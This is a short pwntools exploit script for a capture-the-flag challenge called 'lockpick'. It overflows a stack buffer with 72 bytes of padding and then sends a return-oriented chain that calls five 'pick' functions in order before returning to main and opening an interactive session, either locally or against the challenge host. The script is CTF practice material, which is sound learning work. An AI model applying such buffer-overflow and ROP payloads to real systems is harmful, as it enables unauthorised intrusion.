from pwn import *             

context.log_level = 'warning' 


context.update(arch='x86_64', os='linux') 
context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe']
#context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe','-d','kali-linux', '-u', 'root'] #kali

HOST="lockpick.deadface.io:26697"
#lockpick.deadface.io:26697
ADDRESS,PORT=HOST.split(":")


BINARY_NAME="./lockpick"
binary = context.binary = ELF(BINARY_NAME, checksec=False)

if args.REMOTE:
    p = remote(ADDRESS,PORT)
else:
    p = process(binary.path)    

ret=0x000000000040101a

main = binary.symbols.main
#main =  0x000000000040140e
pad = b"A"*72
chain = (
    p64(0x401301) + p64(ret) +   # pick3 + padding
    p64(0x401366) + p64(ret) +   # pick5 + padding
    p64(0x401321) + p64(ret) +   # pick4 + padding
    p64(0x40125e) + p64(ret) +   # pick1 + padding
    p64(0x4012a3) + p64(ret) +   # pick2 + padding
    p64(main+36)
)



payload = pad + chain
p.sendlineafter(b'How do you open a lock with no key?', payload)
p.interactive()




